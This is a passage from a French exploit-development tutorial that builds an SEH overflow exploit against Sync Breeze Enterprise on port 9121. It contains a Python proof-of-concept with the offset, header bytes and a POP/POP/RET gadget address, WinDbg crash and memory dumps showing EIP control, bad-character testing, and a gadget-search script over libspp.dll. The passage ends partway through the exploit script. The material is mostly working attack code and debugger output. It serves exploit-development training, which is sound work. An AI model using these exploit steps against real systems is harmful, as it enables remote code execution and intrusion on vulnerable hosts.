<a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a>
<a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">128</span>
<a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x42\x42\x42</span><span class="s2">&quot;</span>
<a id="__codelineno-35-35" name="__codelineno-35-35" href="#__codelineno-35-35"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">badchars</span>
<a id="__codelineno-35-36" name="__codelineno-35-36" href="#__codelineno-35-36"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-35-37" name="__codelineno-35-37" href="#__codelineno-35-37"></a>
<a id="__codelineno-35-38" name="__codelineno-35-38" href="#__codelineno-35-38"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-35-39" name="__codelineno-35-39" href="#__codelineno-35-39"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-35-40" name="__codelineno-35-40" href="#__codelineno-35-40"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-35-41" name="__codelineno-35-41" href="#__codelineno-35-41"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-35-42" name="__codelineno-35-42" href="#__codelineno-35-42"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-35-43" name="__codelineno-35-43" href="#__codelineno-35-43"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-35-44" name="__codelineno-35-44" href="#__codelineno-35-44"></a>
<a id="__codelineno-35-45" name="__codelineno-35-45" href="#__codelineno-35-45"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-35-46" name="__codelineno-35-46" href="#__codelineno-35-46"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="p">(</span><span class="n">b40</span><span class="p">.</span><span class="n">17d4</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">42424242</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="n">eip</span><span class="p">=</span><span class="n">42424242</span> <span class="n">esp</span><span class="p">=</span><span class="n">021af438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">021af458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="n">42424242</span> <span class="p">??</span>              <span class="p">???</span>
</code></pre></div>
<p><code>EIP</code> est toujours sous notre contrôle et contient bien les <code>0x42</code>. On affiche maintenant les octets pointés par le deuxième paramètre (<code>EstablisherFrame</code>) passé à la fonction <code>_except_handler</code> à partir du registre de pile (<code>ESP</code>) :</p>
<blockquote>
<p><strong>Note</strong> : Comme vu précédemment, c'est le paramètre <code>EstablisherFrame</code> qui contient notre payload et donc les caractères de <code>0x01</code> a <code>0xFF</code>.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c">#</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="n">esp</span> <span class="n">L5</span>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="n">021af438</span>  <span class="n">77853b02</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x26</span>
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">021af43c</span>  <span class="n">021af540</span>
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="n">021af440</span>  <span class="n">021aff54</span>
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">021af444</span>  <span class="n">021af55c</span>
<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="n">021af448</span>  <span class="n">021af4cc</span>
<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="c">#</span>
<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">021aff54</span>
<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="n">021aff54</span>  <span class="n">41</span> <span class="n">41</span> <span class="n">41</span> <span class="n">41</span> <span class="n">42</span> <span class="n">42</span> <span class="n">42</span> <span class="n">42</span><span class="p">-</span><span class="n">01</span> <span class="n">03</span> <span class="n">04</span> <span class="n">05</span> <span class="n">06</span> <span class="n">07</span> <span class="n">08</span> <span class="n">09</span>  <span class="n">AAAABBBB</span><span class="p">........</span>
<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="n">021aff64</span>  <span class="n">00</span> <span class="n">3e</span> <span class="n">8d</span> <span class="n">00</span> <span class="n">38</span> <span class="n">6b</span> <span class="n">d8</span> <span class="n">00</span><span class="p">-</span><span class="n">72</span> <span class="n">40</span> <span class="n">8d</span> <span class="n">00</span> <span class="n">40</span> <span class="n">6f</span> <span class="n">d8</span> <span class="n">00</span>  <span class="p">.&gt;..</span><span class="n">8k</span><span class="p">..</span><span class="n">r</span><span class="p">@..</span><span class="nv">@o</span><span class="p">..</span>
</code></pre></div>
<p>On identifie que <code>0x02</code> n'est pas présent, indiquant que c'est un mauvais caractère.</p>
<p>On continue la procédure jusqu'à identifier tous les mauvais caractères.</p>
<blockquote>
<p><strong>Note</strong> : Il est possible qu'il n'y ait pas assez de place pour stocker tous les caractères jusqu'à <code>0xFF</code>. Dans ce cas, il est nécessaire de supprimer une première partie ayant déjà été validée pour vérifier les caractères suivants.</p>
</blockquote>
<h3 id="trouver-une-sequence-ppr">Trouver une séquence P/P/R</h3>
<p>Pour rediriger le flot d'exécution, il faut donc trouver une séquence d'instruction P/P/R tout en prenant en compte les protections mémoire.</p>
<p>On utilise les modules présents nativement dans WinDBG :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">.</span><span class="n">load</span> <span class="n">narly</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="c">#</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="c"># List tous les modules chargés et leurs protections mémoire</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">nmod</span>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="n">00400000</span> <span class="n">00463000</span> <span class="n">syncbrs</span>              <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">OFF</span>                <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">syncbrs</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="n">00540000</span> <span class="n">00614000</span> <span class="n">libpal</span>               <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">OFF</span>                <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="n">00920000</span> <span class="n">009d5000</span> <span class="n">libsync</span>              <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">OFF</span>                <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libsync</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="n">10000000</span> <span class="n">10226000</span> <span class="n">libspp</span>               <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">OFF</span>                <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libspp</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="n">53ea0000</span> <span class="n">53eb6000</span> <span class="n">pnrpnsp</span>              <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">ON</span>  <span class="p">/</span><span class="n">GS</span> <span class="p">*</span><span class="n">ASLR</span> <span class="p">*</span><span class="n">DEP</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">pnrpnsp</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="n">549a0000</span> <span class="n">549b1000</span> <span class="n">napinsp</span>              <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">ON</span>  <span class="p">/</span><span class="n">GS</span> <span class="p">*</span><span class="n">ASLR</span> <span class="p">*</span><span class="n">DEP</span> 
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="p">[...]</span>
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="n">75e70000</span> <span class="n">75e92000</span> <span class="n">GDI32</span>                <span class="n">NO_SEH</span>       <span class="p">/</span><span class="n">GS</span> <span class="p">*</span><span class="n">ASLR</span> <span class="p">*</span><span class="n">DEP</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">GDI32</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="n">77710000</span> <span class="n">777a5000</span> <span class="n">KERNEL32</span>             <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">ON</span>  <span class="p">/</span><span class="n">GS</span> <span class="p">*</span><span class="n">ASLR</span> <span class="p">*</span><span class="n">DEP</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">KERNEL32</span><span class="p">.</span><span class="n">DLL</span>
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="n">777b0000</span> <span class="n">77940000</span> <span class="n">ntdll</span>                <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">ON</span>  <span class="p">/</span><span class="n">GS</span> <span class="p">*</span><span class="n">ASLR</span> <span class="p">*</span><span class="n">DEP</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SYSTEM32</span><span class="p">\</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span>
</code></pre></div>
<ul>
<li>L'indication <code>/SafeSEH OFF</code> indique que <code>syncbrs.exe</code> et les modules <code>libpal.dll</code> - <code>libsync.dll</code> et <code>libspp.dll</code> sont compilés sans <code>SafeSEH</code></li>
<li>Les protections <code>DEP</code> et <code>ASLR</code> ne sont pas actives non plus</li>
</ul>
<p>Pour que l'exploit soit le plus stable possible on va chercher la séquence P/P/R dans un module qui fait partie de l'application, ainsi <code>libspp.dll</code> est un bon candidat.</p>
<p>On va écrire un petit script pour chercher les instructions P/P/R car contrairement à l'instruction <code>JMP ESP</code> qu'on cherchait via la commande <code>s</code> de WinDBG, ici les instructions <code>POP</code> peuvent s'appliquer à un grand nombre de registres.</p>
<p>Le script aura besoin des éléments suivants pour fonctionner :</p>
<ul>
<li>L'adresse de début de la plage mémoire</li>
<li>L'adresse de fin de la plage mémoire</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">lm</span> <span class="n">m</span> <span class="n">libspp</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="n">Browse</span> <span class="n">full</span> <span class="n">module</span> <span class="n">list</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="nb">start </span>   <span class="k">end</span>        <span class="n">module</span> <span class="n">name</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="n">10000000</span> <span class="n">10226000</span>   <span class="n">libspp</span>     <span class="p">(</span><span class="n">deferred</span><span class="p">)</span> 
</code></pre></div>
<ul>
<li>Les <em>opcodes</em> des instructions à chercher</li>
<li>On génère les <em>opcodes</em> des instructions <code>POP</code> pour tous les registres x86 sauf <code>ESP</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="p">$</span> <span class="n">msf-nasm_shell</span> 
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">eax</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="n">00000000</span>  <span class="n">58</span>                <span class="n">pop</span> <span class="n">eax</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c">#</span>
<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">ebx</span>
<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="n">00000000</span>  <span class="n">5B</span>                <span class="n">pop</span> <span class="n">ebx</span>
<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="c">#</span>
<a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">ecx</span>
<a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="n">00000000</span>  <span class="n">59</span>                <span class="n">pop</span> <span class="n">ecx</span>
<a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="c">#</span>
<a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">edx</span>
<a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a><span class="n">00000000</span>  <span class="n">5A</span>                <span class="n">pop</span> <span class="n">edx</span>
<a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="c">#</span>
<a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">esi</span>
<a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="n">00000000</span>  <span class="n">5E</span>                <span class="n">pop</span> <span class="n">esi</span>
<a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a><span class="c">#</span>
<a id="__codelineno-40-17" name="__codelineno-40-17" href="#__codelineno-40-17"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">edi</span>
<a id="__codelineno-40-18" name="__codelineno-40-18" href="#__codelineno-40-18"></a><span class="n">00000000</span>  <span class="n">5F</span>                <span class="n">pop</span> <span class="n">edi</span>
<a id="__codelineno-40-19" name="__codelineno-40-19" href="#__codelineno-40-19"></a><span class="c">#</span>
<a id="__codelineno-40-20" name="__codelineno-40-20" href="#__codelineno-40-20"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="nb">ebp</span>
<a id="__codelineno-40-21" name="__codelineno-40-21" href="#__codelineno-40-21"></a><span class="n">00000000</span>  <span class="n">5D</span>                <span class="n">pop</span> <span class="nb">ebp</span>
<a id="__codelineno-40-22" name="__codelineno-40-22" href="#__codelineno-40-22"></a><span class="c">#</span>
<a id="__codelineno-40-23" name="__codelineno-40-23" href="#__codelineno-40-23"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">ret</span>
<a id="__codelineno-40-24" name="__codelineno-40-24" href="#__codelineno-40-24"></a><span class="n">00000000</span>  <span class="n">C3</span>                <span class="n">ret</span>
</code></pre></div>
<p>On voit que les <em>opcodes</em> se suivent pour les instructions <code>POP R32</code> : <code>58 59 5a 5b [5c] 5d 5e 5f</code>.</p>
<p>Script final pour identifier la séquence en mémoire :</p>
<ul>
<li><code>.block</code> : Définis un bloc de code à exécuter</li>
<li><code>.for (r $t0 = 0x58; $t0 &lt; 0x5F; r $t0 = $t0 + 0x01)</code> : Boucle en utilisant le pseudo-registre <code>t0</code> en commençant à <code>0x58</code> pour finir avant <code>0x5F</code>. Cette première boucle vise à identifier la première instruction <code>POP R32</code>.</li>
<li><code>.for (r $t1 = 0x58; $t1 &lt; 0x5F; r $t1 = $t1 + 0x01)</code> : Deuxième boucle qui vise à identifier la deuxième instruction <code>POP R32</code>.</li>
<li><code>s-[1]b 10000000 10226000 $t0 $t1 c3</code> : Commande de recherche des instructions P/P/R.</li>
<li>Le flag <code>1</code> indique qu'on veut afficher l'adresse ou les <em>opcodes</em> sont trouvés</li>
<li>Adresses de début et de fin du module cible</li>
<li>Les deux pseudo-regitres <code>t0</code> et <code>t1</code></li>
<li><em>Opcode</em> de l'instruction <code>ret</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="o">.</span><span class="n">block</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="p">{</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a> <span class="o">.</span><span class="k">for</span> <span class="p">(</span><span class="n">r</span> <span class="err">$</span><span class="n">t0</span> <span class="o">=</span> <span class="mh">0x58</span><span class="p">;</span> <span class="err">$</span><span class="n">t0</span> <span class="o">&lt;</span> <span class="mh">0x5F</span><span class="p">;</span> <span class="n">r</span> <span class="err">$</span><span class="n">t0</span> <span class="o">=</span> <span class="err">$</span><span class="n">t0</span> <span class="o">+</span> <span class="mh">0x01</span><span class="p">)</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a> <span class="p">{</span>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>  <span class="o">.</span><span class="k">for</span> <span class="p">(</span><span class="n">r</span> <span class="err">$</span><span class="n">t1</span> <span class="o">=</span> <span class="mh">0x58</span><span class="p">;</span> <span class="err">$</span><span class="n">t1</span> <span class="o">&lt;</span> <span class="mh">0x5F</span><span class="p">;</span> <span class="n">r</span> <span class="err">$</span><span class="n">t1</span> <span class="o">=</span> <span class="err">$</span><span class="n">t1</span> <span class="o">+</span> <span class="mh">0x01</span><span class="p">)</span>
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>  <span class="p">{</span>
<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>   <span class="n">s</span><span class="o">-</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="n">b</span> <span class="mi">10000000</span> <span class="mi">10226000</span> <span class="err">$</span><span class="n">t0</span> <span class="err">$</span><span class="n">t1</span> <span class="n">c3</span>
<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>  <span class="p">}</span>
<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a> <span class="p">}</span>
<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="p">}</span>
</code></pre></div>
<p>Le script peut être enregistré sur le disque pour être ensuite exécuté via WinDBG :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">$&gt;&lt;</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Offsec</span><span class="p">\</span><span class="n">Downloads</span><span class="p">\</span><span class="n">script</span><span class="p">.</span><span class="n">wds</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="n">0x1015a2f0</span>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="n">0x100087dd</span>
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="n">0x10008808</span>
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="p">[...]</span>
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="n">0x100491e4</span>
</code></pre></div>
<p>On désassemble la première adresse indiquée par le script. Le flot P/P/R s'y trouve bien :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
</code></pre></div>
<p>On modifie la preuve de concept :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>
<a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">128</span>                           <span class="c1"># Offset exact</span>
<a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x1015a2f0</span><span class="p">))</span>               <span class="c1"># P/P/R (EIP)</span>
<a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>    <span class="c1"># Payload</span>
<a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>
<a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
